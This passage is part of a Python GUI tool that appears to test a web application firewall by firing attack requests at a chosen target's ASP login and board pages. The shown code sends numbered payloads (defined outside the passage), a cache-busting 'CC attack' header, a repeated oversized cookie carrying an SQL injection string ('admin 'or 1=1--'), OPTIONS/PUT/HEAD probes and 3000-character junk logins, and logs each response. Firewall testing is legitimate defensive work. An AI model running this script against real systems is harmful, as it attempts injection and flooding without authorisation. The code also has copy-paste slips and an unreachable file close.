                self.f.write("\n")
                self.f.write("\n")

                self.f.write(srr.url)
                self.f.write("\n")
                self.f.write("Response Time:"+str(srr.elapsed)+"/"+"Status Code:"+str(srr.status_code))
                self.f.write("\n")
                self.f.write("\n")

             else:
                rr = requests.get('http://'+target+'/'+'login.asp',params=payload1)
                arr1 = requests.post('http://'+target+'/'+'login-process.asp', data=payload2)
                arr2 = requests.post('http://'+target+'/'+'login-process.asp', data=payload3)
                arr3 = requests.post('http://'+target+'/'+'login-process.asp', data=payload4)
                arr4 = requests.post('http://'+target+'/'+'login-process.asp', data=payload5)
                arr5 = requests.post('http://'+target+'/'+'login-process.asp', data=payload6)
                arr6 = requests.post('http://'+target+'/'+'login-process.asp', data=payload7)
                arr7 = requests.post('http://'+target+'/'+'login-process.asp', data=payload8)
                arr8 = requests.post('http://'+target+'/'+'login-process.asp', data=payload9)
                arr9 = requests.post('http://'+target+'/'+'login-process.asp', data=payload10)
                arr10 = requests.post('http://'+target+'/'+'login-process.asp', data=payload11)
                arr11 = requests.post('http://'+target+'/'+'login-process.asp', data=payload12)
                arr12 = requests.post('http://'+target+'/'+'login-process.asp', data=payload13)
                arr13 = requests.post('http://'+target+'/'+'login-process.asp', data=payload14)
                arr14 = requests.post('http://'+target+'/'+'login-process.asp', data=payload15)
                arr15 = requests.post('http://'+target+'/'+'login-process.asp', data=payload16)
                arr16 = requests.post('http://'+target+'/'+'login-process.asp', data=payload17)
                arr17 = requests.post('http://'+target+'/'+'login-process.asp', data=payload18)

                headers = {'Cache-Control': 'no-store, must-revalidate'} # CC attack
                headers1 = { 'Cookie': 'ASPSESSIONIDACTRACDC=KGIDFELACGFEPFNHCNKNNOAL; erpcookie=userpriv=1&userprivname=%B0%FC%B8%AE%C0%DA&userid=admin \'or 1=1--&username=%B0%FC%B8%AE%C0%DA&userlocale=1042; ASPSESSIONIDCATTBDCC=AJKFCNMAOLCNMABEJMAANELH; ASPSESSIONIDCATSADDC=HOOFKCNAINAOPGJKJPNCMHJJ'*50 } # Long Cookie
                arr18 = requests.get('http://'+target+'/'+'login.asp', headers=headers)
                arr19 = requests.get('http://'+target+'/'+'main.asp', headers=headers1)

                arr20 = requests.options('http://'+target+'/'+'login.asp')
                arr21 = requests.put('http://'+target+'/'+'login.asp')
                arr22 = requests.head('http://'+target+'/'+'login.asp')

                arr23 = requests.get('http://'+target+'/'+'pds/pds_view.asp',params=payload19)
                arr24 = requests.get('http://'+target+'/'+'pds/pds_view.asp',params=payload20)
                arr25 = requests.get('http://'+target+'/'+'pds/pds_view.asp',params=payload21)
                arr26 = requests.get('http://'+target+'/'+'pds/pds_view.asp',params=payload22)
                arr27 = requests.get('http://'+target+'/'+'pds/pds_view.asp',params=payload23)
                arr28 = requests.get('http://'+target+'/'+'pds/pds_view.asp',params=payload24)
                arr29 = requests.get('http://'+target+'/'+'pds/pds_view.asp',params=payload25)
                arr30 = requests.get('http://'+target+'/'+'pds/pds_view.asp',params=payload26)
                arr31 = requests.get('http://'+target+'/'+'pds/pds_view.asp',params=payload27)
                arr32 = requests.get('http://'+target+'/'+'pds/pds_view.asp',params=payload28)
                arr33 = requests.get('http://'+target+'/'+'pds/pds_view.asp',params=payload29)
                arr34 = requests.get('http://'+target+'/'+'pds/pds_view.asp',params=payload30)
                arr35 = requests.get('http://'+target+'/'+'pds/pds_view.asp',params=payload31)
                arr36 = requests.get('http://'+target+'/'+'pds/pds_view.asp',params=payload32)
                arr37 = requests.get('http://'+target+'/'+'pds/pds_view.asp',params=payload33)
                arr38 = requests.get('http://'+target+'/'+'pds/pds_view.asp',params=payload34)
                arr39 = requests.get('http://'+target+'/'+'pds/pds_view.asp',params=payload35)
                arr40 = requests.get('http://'+target+'/'+'pds/pds_view.asp',params=payload36)
                arr41 = requests.get('http://'+target+'/'+'pds/pds_view.asp',params=payload37)
                arr42 = requests.get('http://'+target+'/'+'pds/pds_view.asp',params=payload38)
                arr43 = requests.get('http://'+target+'/'+'pds/pds_view.asp',params=payload39)
                arr44 = requests.get('http://'+target+'/'+'pds/pds_view.asp',params=payload40)
                arr45 = requests.get('http://'+target+'/'+'pds/pds_view.asp',params=payload41)
                arr46 = requests.get('http://'+target+'/'+'pds/pds_view.asp',params=payload42)
                arr47 = requests.get('http://'+target+'/'+'pds/pds_view.asp',params=payload43)




                self.f.write(arr1.url)
                self.f.write("\n")
                self.f.write(str(arr1.request.headers))
                self.f.write("\n")
                self.f.write(str(payload2))
                self.f.write("\n")
                self.f.write("Response Time:"+str(arr1.elapsed)+"/"+"Status Code:"+str(arr1.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(arr2.url)
                self.f.write("\n")
                self.f.write(str(arr2.request.headers))
                self.f.write("\n")
                self.f.write(str(payload3))
                self.f.write("\n")
                self.f.write("Response Time:"+str(arr2.elapsed)+"/"+"Status Code:"+str(arr2.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(arr3.url)
                self.f.write("\n")
                self.f.write(str(arr3.request.headers))
                self.f.write("\n")
                self.f.write(str(payload4))
                self.f.write("\n")
                self.f.write("Response Time:"+str(arr3.elapsed)+"/"+"Status Code:"+str(arr3.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(arr4.url)
                self.f.write("\n")
                self.f.write(str(arr4.request.headers))
                self.f.write("\n")
                self.f.write(str(payload5))
                self.f.write("\n")
                self.f.write("Response Time:"+str(arr4.elapsed)+"/"+"Status Code:"+str(arr4.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(arr5.url)
                self.f.write("\n")
                self.f.write(str(arr5.request.headers))
                self.f.write("\n")
                self.f.write(str(payload6))
                self.f.write("\n")
                self.f.write("Response Time:"+str(arr5.elapsed)+"/"+"Status Code:"+str(arr5.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(arr6.url)
                self.f.write("\n")
                self.f.write(str(arr6.request.headers))
                self.f.write("\n")
                self.f.write(str(payload7))
                self.f.write("\n")
                self.f.write("Response Time:"+str(arr6.elapsed)+"/"+"Status Code:"+str(arr6.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(arr7.url)
                self.f.write("\n")
                self.f.write(str(arr7.request.headers))
                self.f.write("\n")
                self.f.write(str(payload8))
                self.f.write("\n")
                self.f.write("Response Time:"+str(arr7.elapsed)+"/"+"Status Code:"+str(arr7.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(arr8.url)
                self.f.write("\n")
                self.f.write(str(arr8.request.headers))
                self.f.write("\n")
                self.f.write(str(payload9))
                self.f.write("\n")
                self.f.write("Response Time:"+str(arr8.elapsed)+"/"+"Status Code:"+str(arr8.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(arr9.url)
                self.f.write("\n")
                self.f.write(str(arr9.request.headers))
                self.f.write("\n")
                self.f.write(str(payload10))
                self.f.write("\n")
                self.f.write("Response Time:"+str(arr9.elapsed)+"/"+"Status Code:"+str(arr9.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(arr10.url)
                self.f.write("\n")
                self.f.write(str(arr10.request.headers))
                self.f.write("\n")
                self.f.write(str(payload11))
                self.f.write("\n")
                self.f.write("Response Time:"+str(arr10.elapsed)+"/"+"Status Code:"+str(arr10.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(arr11.url)
                self.f.write("\n")
                self.f.write(str(arr11.request.headers))
                self.f.write("\n")
                self.f.write(str(payload12))
                self.f.write("\n")
                self.f.write("Response Time:"+str(arr11.elapsed)+"/"+"Status Code:"+str(arr11.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(arr12.url)
                self.f.write("\n")
                self.f.write(str(arr12.request.headers))
                self.f.write("\n")
                self.f.write(str(payload13))
                self.f.write("\n")
                self.f.write("Response Time:"+str(arr12.elapsed)+"/"+"Status Code:"+str(arr12.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(arr13.url)
                self.f.write("\n")
                self.f.write(str(arr13.request.headers))
                self.f.write("\n")
                self.f.write(str(payload14))
                self.f.write("\n")
                self.f.write("Response Time:"+str(arr13.elapsed)+"/"+"Status Code:"+str(arr13.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(arr14.url)
                self.f.write("\n")
                self.f.write(str(arr14.request.headers))
                self.f.write("\n")
                self.f.write(str(payload15))
                self.f.write("\n")
                self.f.write("Response Time:"+str(arr14.elapsed)+"/"+"Status Code:"+str(arr14.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(arr15.url)
                self.f.write("\n")
                self.f.write(str(arr15.request.headers))
                self.f.write("\n")
                self.f.write(str(payload16))
                self.f.write("\n")
                self.f.write("Response Time:"+str(arr15.elapsed)+"/"+"Status Code:"+str(arr15.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(arr16.url)
                self.f.write("\n")
                self.f.write(str(arr16.request.headers))
                self.f.write("\n")
                self.f.write(str(payload17))
                self.f.write("\n")
                self.f.write("Response Time:"+str(arr16.elapsed)+"/"+"Status Code:"+str(arr16.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(arr17.url)
                self.f.write("\n")
                self.f.write(str(arr17.request.headers))
                self.f.write("\n")
                self.f.write(str(payload18))
                self.f.write("\n")
                self.f.write("Response Time:"+str(arr17.elapsed)+"/"+"Status Code:"+str(arr17.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(arr18.url)
                self.f.write("\n")
                self.f.write(str(arr18.request.headers))
                self.f.write("\n")
                self.f.write("Response Time:"+str(arr17.elapsed)+"/"+"Status Code:"+str(arr18.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(arr19.url)
                self.f.write("\n")
                self.f.write(str(arr19.request.headers))
                self.f.write("\n")
                self.f.write("Response Time:"+str(arr19.elapsed)+"/"+"Status Code:"+str(arr19.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(arr20.url)
                self.f.write("\n")
                self.f.write(str(arr20.request.headers))
                self.f.write("\n")
                self.f.write("Response Time:"+str(arr20.elapsed)+"/"+"Status Code:"+str(arr20.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(arr21.url)
                self.f.write("\n")
                self.f.write(str(arr21.request.headers))
                self.f.write("\n")
                self.f.write("Response Time:"+str(arr21.elapsed)+"/"+"Status Code:"+str(arr21.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(arr22.url)
                self.f.write("\n")
                self.f.write(str(arr22.request.headers))
                self.f.write("\n")
                self.f.write("Response Time:"+str(arr22.elapsed)+"/"+"Status Code:"+str(arr22.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(arr23.url)
                self.f.write("\n")
                self.f.write(str(arr23.request.headers))
                self.f.write("\n")
                self.f.write(str(payload19))
                self.f.write("\n")
                self.f.write("Response Time:"+str(arr23.elapsed)+"/"+"Status Code:"+str(arr23.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(arr24.url)
                self.f.write("\n")
                self.f.write(str(arr24.request.headers))
                self.f.write("\n")
                self.f.write(str(payload20))
                self.f.write("\n")
                self.f.write("Response Time:"+str(arr24.elapsed)+"/"+"Status Code:"+str(arr24.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(arr25.url)
                self.f.write("\n")
                self.f.write(str(arr25.request.headers))
                self.f.write("\n")
                self.f.write(str(payload21))
                self.f.write("\n")
                self.f.write("Response Time:"+str(arr25.elapsed)+"/"+"Status Code:"+str(arr25.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(arr26.url)
                self.f.write("\n")
                self.f.write(str(arr26.request.headers))
                self.f.write("\n")
                self.f.write(str(payload22))
                self.f.write("\n")
                self.f.write("Response Time:"+str(arr26.elapsed)+"/"+"Status Code:"+str(arr26.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(arr27.url)
                self.f.write("\n")
                self.f.write(str(arr27.request.headers))
                self.f.write("\n")
                self.f.write(str(payload23))
                self.f.write("\n")
                self.f.write("Response Time:"+str(arr27.elapsed)+"/"+"Status Code:"+str(arr27.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(arr28.url)
                self.f.write("\n")
                self.f.write(str(arr28.request.headers))
                self.f.write("\n")
                self.f.write(str(payload24))
                self.f.write("\n")
                self.f.write("Response Time:"+str(arr28.elapsed)+"/"+"Status Code:"+str(arr28.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(arr29.url)
                self.f.write("\n")
                self.f.write(str(arr29.request.headers))
                self.f.write("\n")
                self.f.write(str(payload25))
                self.f.write("\n")
                self.f.write("Response Time:"+str(arr29.elapsed)+"/"+"Status Code:"+str(arr29.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(arr30.url)
                self.f.write("\n")
                self.f.write(str(arr30.request.headers))
                self.f.write("\n")
                self.f.write(str(payload26))
                self.f.write("\n")
                self.f.write("Response Time:"+str(arr30.elapsed)+"/"+"Status Code:"+str(arr30.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(arr31.url)
                self.f.write("\n")
                self.f.write(str(arr31.request.headers))
                self.f.write("\n")
                self.f.write(str(payload27))
                self.f.write("\n")
                self.f.write("Response Time:"+str(arr31.elapsed)+"/"+"Status Code:"+str(arr31.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(arr32.url)
                self.f.write("\n")
                self.f.write(str(arr32.request.headers))
                self.f.write("\n")
                self.f.write(str(payload28))
                self.f.write("\n")
                self.f.write("Response Time:"+str(arr32.elapsed)+"/"+"Status Code:"+str(arr32.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(arr33.url)
                self.f.write("\n")
                self.f.write(str(arr33.request.headers))
                self.f.write("\n")
                self.f.write(str(payload29))
                self.f.write("\n")
                self.f.write("Response Time:"+str(arr33.elapsed)+"/"+"Status Code:"+str(arr33.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(arr34.url)
                self.f.write("\n")
                self.f.write(str(arr34.request.headers))
                self.f.write("\n")
                self.f.write(str(payload30))
                self.f.write("\n")
                self.f.write("Response Time:"+str(arr34.elapsed)+"/"+"Status Code:"+str(arr34.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(arr35.url)
                self.f.write("\n")
                self.f.write(str(arr35.request.headers))
                self.f.write("\n")
                self.f.write(str(payload31))
                self.f.write("\n")
                self.f.write("Response Time:"+str(arr35.elapsed)+"/"+"Status Code:"+str(arr35.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(arr36.url)
                self.f.write("\n")
                self.f.write(str(arr36.request.headers))
                self.f.write("\n")
                self.f.write(str(payload32))
                self.f.write("\n")
                self.f.write("Response Time:"+str(arr36.elapsed)+"/"+"Status Code:"+str(arr36.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(arr37.url)
                self.f.write("\n")
                self.f.write(str(arr37.request.headers))
                self.f.write("\n")
                self.f.write(str(payload33))
                self.f.write("\n")
                self.f.write("Response Time:"+str(arr37.elapsed)+"/"+"Status Code:"+str(arr37.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(arr38.url)
                self.f.write("\n")
                self.f.write(str(arr38.request.headers))
                self.f.write("\n")
                self.f.write(str(payload34))
                self.f.write("\n")
                self.f.write("Response Time:"+str(arr38.elapsed)+"/"+"Status Code:"+str(arr38.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(arr39.url)
                self.f.write("\n")
                self.f.write(str(arr39.request.headers))
                self.f.write("\n")
                self.f.write(str(payload35))
                self.f.write("\n")
                self.f.write("Response Time:"+str(arr39.elapsed)+"/"+"Status Code:"+str(arr39.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(arr40.url)
                self.f.write("\n")
                self.f.write(str(arr40.request.headers))
                self.f.write("\n")
                self.f.write(str(payload36))
                self.f.write("\n")
                self.f.write("Response Time:"+str(arr40.elapsed)+"/"+"Status Code:"+str(arr40.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(arr41.url)
                self.f.write("\n")
                self.f.write(str(arr41.request.headers))
                self.f.write("\n")
                self.f.write(str(payload37))
                self.f.write("\n")
                self.f.write("Response Time:"+str(arr41.elapsed)+"/"+"Status Code:"+str(arr41.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(arr42.url)
                self.f.write("\n")
                self.f.write(str(arr42.request.headers))
                self.f.write("\n")
                self.f.write(str(payload38))
                self.f.write("\n")
                self.f.write("Response Time:"+str(arr42.elapsed)+"/"+"Status Code:"+str(arr42.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(arr43.url)
                self.f.write("\n")
                self.f.write(str(arr43.request.headers))
                self.f.write("\n")
                self.f.write(str(payload39))
                self.f.write("\n")
                self.f.write("Response Time:"+str(arr43.elapsed)+"/"+"Status Code:"+str(arr43.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(arr44.url)
                self.f.write("\n")
                self.f.write(str(arr44.request.headers))
                self.f.write("\n")
                self.f.write(str(payload40))
                self.f.write("\n")
                self.f.write("Response Time:"+str(arr44.elapsed)+"/"+"Status Code:"+str(arr44.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(arr45.url)
                self.f.write("\n")
                self.f.write(str(arr45.request.headers))
                self.f.write("\n")
                self.f.write(str(payload41))
                self.f.write("\n")
                self.f.write("Response Time:"+str(arr45.elapsed)+"/"+"Status Code:"+str(arr45.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(arr46.url)
                self.f.write("\n")
                self.f.write(str(arr46.request.headers))
                self.f.write("\n")
                self.f.write(str(payload42))
                self.f.write("\n")
                self.f.write("Response Time:"+str(arr46.elapsed)+"/"+"Status Code:"+str(arr46.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(arr47.url)
                self.f.write("\n")
                self.f.write(str(arr47.request.headers))
                self.f.write("\n")
                self.f.write(str(payload43))
                self.f.write("\n")
                self.f.write("Response Time:"+str(arr47.elapsed)+"/"+"Status Code:"+str(arr47.status_code))
                self.f.write("\n")
                self.f.write("\n")


                self.f.write(rr.url)
                self.f.write("\n")
                self.f.write(str(rr.request.headers))
                self.f.write("\n")
                self.f.write("\n")
                self.f.write("Response Time:"+str(rr.elapsed)+"/"+"Status Code:"+str(rr.status_code))
                self.f.write("\n")
                self.f.write("\n")





        for i in range(1,10):
            chars=string.ascii_uppercase + string.digits
            ran = ''.join(random.choice(chars) for _ in range(3000))
            payload = { 'user_id' : ran, 'user_password' : ran }



            if(port == '443'):
                srr = requests.post('https://'+target+'/'+'login-process.asp',data=payload,verify=False)
                self.f.write("POST"+" "+ srr.url)
                self.f.write(str(srr.request.headers))
                self.f.write(str(payload))

                self.f.write("\n")
                self.f.write("Response Time:"+str(srr.elapsed)+"/"+"Status Code:"+str(srr.status_code))
                self.f.write("\n")
                self.f.write("\n")

            else:
                rr = requests.post('http://'+target+'/'+'login-process.asp',data=payload)
                self.f.write("POST"+" "+ rr.url)
                self.f.write(str(rr.request.headers))
                self.f.write(str(payload))

                self.f.write("\n")
                self.f.write("Response Time:"+str(rr.elapsed)+"/"+"Status Code:"+str(rr.status_code))
                self.f.write("\n")
                self.f.write("\n")

        for i in range(1,10):
             if(port == '443'):
                srr = requests.get('https://'+target+'/'+'login.asp',params=payload,verify=False)
                srr1 = requests.get('https://'+target+'/'+'files'+'/'+'bbs'+'/'+'waf_test.doc',verify=False)
                srr2 = requests.get('https://'+target+'/'+'files/bbs/waf_test.docx',verify=False)
                srr3 = requests.get('https://'+target+'/'+'files/bbs/waf_test.xls',verify=False)
                srr4 = requests.get('https://'+target+'/'+'files/bbs/waf_test.xlsx',verify=False)
                srr5 = requests.get('https://'+target+'/'+'files/bbs/waf_test.ppt',verify=False)
                srr6 = requests.get('https://'+target+'/'+'files/bbs/waf_test.pptx',verify=False)
                srr7 = requests.get('https://'+target+'/'+'files/bbs/waf_test.hwp',verify=False)
                srr8 = requests.get('https://'+target+'/'+'files/bbs/waf_test.pdf',verify=False)
                srr9 = requests.get('https://'+target+'/'+'files/bbs/waf_test.tar',verify=False)
                srr10 = requests.get('https://'+target+'/'+'files/bbs/waf_test.tgz',verify=False)
                srr11 = requests.get('https://'+target+'/'+'files/bbs/waf_test.gz',verify=False)
                srr12 = requests.get('https://'+target+'/'+'files/bbs/waf_test.zip',verify=False)
                srr13 = requests.get('https://'+target+'/'+'files/bbs/waf_test.txt',verify=False)

                self.f.write("----- HTTPS Advanced Content Protection(Attached File Inspection)-----")
                self.f.write("\n")
                self.f.write(srr1.url)
                self.f.write("\n")
                self.f.write("Response data"+str(srr1.headers))
                self.f.write("\n")
                self.f.write("Response Time:"+str(srr1.elapsed)+"/"+"Status Code:"+str(srr1.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(srr2.url)
                self.f.write("\n")
                self.f.write("Response data"+str(srr2.headers))
                self.f.write("\n")
                self.f.write("Response Time:"+str(srr2.elapsed)+"/"+"Status Code:"+str(srr2.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(srr3.url)
                self.f.write("\n")
                self.f.write("Response data"+str(srr3.headers))
                self.f.write("\n")
                self.f.write("Response Time:"+str(srr3.elapsed)+"/"+"Status Code:"+str(srr3.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(srr3.url)
                self.f.write("\n")
                self.f.write("Response data"+str(srr3.headers))
                self.f.write("\n")
                self.f.write("Response Time:"+str(srr3.elapsed)+"/"+"Status Code:"+str(srr3.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(srr4.url)
                self.f.write("\n")
                self.f.write("Response data"+str(srr4.headers))
                self.f.write("\n")
                self.f.write("Response Time:"+str(srr4.elapsed)+"/"+"Status Code:"+str(srr4.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(srr5.url)
                self.f.write("\n")
                self.f.write("Response data"+str(srr5.headers))
                self.f.write("\n")
                self.f.write("Response Time:"+str(srr5.elapsed)+"/"+"Status Code:"+str(srr5.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(srr6.url)
                self.f.write("\n")
                self.f.write("Response data"+str(srr6.headers))
                self.f.write("\n")
                self.f.write("Response Time:"+str(srr6.elapsed)+"/"+"Status Code:"+str(srr6.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(srr7.url)
                self.f.write("\n")
                self.f.write("Response data"+str(srr7.headers))
                self.f.write("\n")
                self.f.write("Response Time:"+str(srr7.elapsed)+"/"+"Status Code:"+str(srr7.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(srr8.url)
                self.f.write("\n")
                self.f.write("Response data"+str(srr8.headers))
                self.f.write("\n")
                self.f.write("Response Time:"+str(srr8.elapsed)+"/"+"Status Code:"+str(srr8.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(srr9.url)
                self.f.write("\n")
                self.f.write("Response data"+str(srr9.headers))
                self.f.write("\n")
                self.f.write("Response Time:"+str(srr9.elapsed)+"/"+"Status Code:"+str(srr9.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(srr10.url)
                self.f.write("\n")
                self.f.write("Response data"+str(srr10.headers))
                self.f.write("\n")
                self.f.write("Response Time:"+str(srr10.elapsed)+"/"+"Status Code:"+str(srr10.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(srr11.url)
                self.f.write("\n")
                self.f.write("Response data"+str(srr11.headers))
                self.f.write("\n")
                self.f.write("Response Time:"+str(srr11.elapsed)+"/"+"Status Code:"+str(srr11.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(srr12.url)
                self.f.write("\n")
                self.f.write("Response data"+str(srr12.headers))
                self.f.write("\n")
                self.f.write("Response Time:"+str(srr12.elapsed)+"/"+"Status Code:"+str(srr12.status_code))
                self.f.write("\n")
                self.f.write("\n")

                self.f.write(srr13.url)
                self.f.write("\n")
                self.f.write("Response data"+str(srr13.headers))
                self.f.write("\n")
                self.f.write("Response Time:"+str(srr13.elapsed)+"/"+"Status Code:"+str(srr13.status_code))
                self.f.write("\n")
                self.f.write("\n")

                if(i==20):
                   self.f.close()

             else:
              rr1 = requests.get('http://'+target+'/'+'files'+'/'+'bbs'+'/'+'waf_test.doc')
              rr2 = requests.get('http://'+target+'/'+'files/bbs/waf_test.docx')
              rr3 = requests.get('http://'+target+'/'+'files/bbs/waf_test.xls')
              rr4 = requests.get('http://'+target+'/'+'files/bbs/waf_test.xlsx')
              rr5 = requests.get('http://'+target+'/'+'files/bbs/waf_test.ppt')
              rr6 = requests.get('http://'+target+'/'+'files/bbs/waf_test.pptx')
              rr7 = requests.get('http://'+target+'/'+'files/bbs/waf_test.hwp')
              rr8 = requests.get('http://'+target+'/'+'files/bbs/waf_test.pdf')
              rr9 = requests.get('http://'+target+'/'+'files/bbs/waf_test.tar')
              rr10 = requests.get('http://'+target+'/'+'files/bbs/waf_test.tgz')
              rr11 = requests.get('http://'+target+'/'+'files/bbs/waf_test.gz')
              rr12 = requests.get('http://'+target+'/'+'files/bbs/waf_test.zip')
              rr13 = requests.get('http://'+target+'/'+'files/bbs/waf_test.txt')

              self.f.write("----------Advanced Content Protection(Attached File Inspection)----------")
              self.f.write("\n")
              self.f.write(rr1.url)
              self.f.write("\n")
              self.f.write("Response data"+str(rr1.headers))
              self.f.write("\n")
              self.f.write("Response Time:"+str(rr1.elapsed)+"/"+"Status Code:"+str(rr1.status_code))
              self.f.write("\n")
              self.f.write("\n")



              self.f.write(rr2.url)
              self.f.write("\n")
              self.f.write("Response data"+str(rr2.headers))
              self.f.write("\n")
              self.f.write("Response Time:"+str(rr2.elapsed)+"/"+"Status Code:"+str(rr2.status_code))
              self.f.write("\n")
              self.f.write("\n")

              self.f.write(rr3.url)
              self.f.write("\n")
              self.f.write("Response data"+str(rr3.headers))
              self.f.write("\n")
              self.f.write("Response Time:"+str(rr3.elapsed)+"/"+"Status Code:"+str(rr3.status_code))
              self.f.write("\n")
              self.f.write("\n")

              self.f.write(rr4.url)
              self.f.write("\n")
              self.f.write("Response data"+str(rr4.headers))
              self.f.write("\n")
              self.f.write("Response Time:"+str(rr4.elapsed)+"/"+"Status Code:"+str(rr4.status_code))
              self.f.write("\n")
              self.f.write("\n")

              self.f.write(rr5.url)
              self.f.write("\n")
              self.f.write("Response data"+str(rr5.headers))
              self.f.write("\n")
              self.f.write("Response Time:"+str(rr5.elapsed)+"/"+"Status Code:"+str(rr5.status_code))
              self.f.write("\n")
              self.f.write("\n")

              self.f.write(rr6.url)
              self.f.write("\n")
              self.f.write("Response data"+str(rr6.headers))
              self.f.write("\n")
              self.f.write("Response Time:"+str(rr6.elapsed)+"/"+"Status Code:"+str(rr6.status_code))
              self.f.write("\n")
              self.f.write("\n")

              self.f.write(rr7.url)
              self.f.write("\n")
              self.f.write("Response data"+str(rr7.headers))
              self.f.write("\n")
              self.f.write("Response Time:"+str(rr7.elapsed)+"/"+"Status Code:"+str(rr7.status_code))
              self.f.write("\n")
              self.f.write("\n")

              self.f.write(rr8.url)
              self.f.write("\n")
              self.f.write("Response data"+str(rr8.headers))
              self.f.write("\n")
              self.f.write("Response Time:"+str(rr8.elapsed)+"/"+"Status Code:"+str(rr8.status_code))
              self.f.write("\n")
              self.f.write("\n")

              self.f.write(rr9.url)
              self.f.write("\n")
              self.f.write("Response data"+str(rr9.headers))
              self.f.write("\n")
              self.f.write("Response Time:"+str(rr9.elapsed)+"/"+"Status Code:"+str(rr9.status_code))
              self.f.write("\n")
              self.f.write("\n")

              self.f.write(rr10.url)
              self.f.write("\n")
              self.f.write("Response data"+str(rr10.headers))
              self.f.write("\n")
              self.f.write("Response Time:"+str(rr10.elapsed)+"/"+"Status Code:"+str(rr10.status_code))
              self.f.write("\n")
              self.f.write("\n")

              self.f.write(rr11.url)
              self.f.write("\n")
              self.f.write("Response data"+str(rr11.headers))
              self.f.write("\n")
              self.f.write("Response Time:"+str(rr11.elapsed)+"/"+"Status Code:"+str(rr11.status_code))
              self.f.write("\n")
              self.f.write("\n")

              self.f.write(rr12.url)
              self.f.write("\n")
              self.f.write("Response data"+str(rr12.headers))
              self.f.write("\n")
              self.f.write("Response Time:"+str(rr12.elapsed)+"/"+"Status Code:"+str(rr12.status_code))
              self.f.write("\n")
              self.f.write("\n")

              self.f.write(rr13.url)
              self.f.write("\n")
              self.f.write("Response data"+str(rr13.headers))
              self.f.write("\n")
              self.f.write("Response Time:"+str(rr13.elapsed)+"/"+"Status Code:"+str(rr13.status_code))
              self.f.write("\n")
              self.f.write("\n")

              if(i==20):
                 self.f.close()



def main():

    ex = wx.App()
    Example(None)
    ex.MainLoop()


if __name__ == '__main__':
      main()
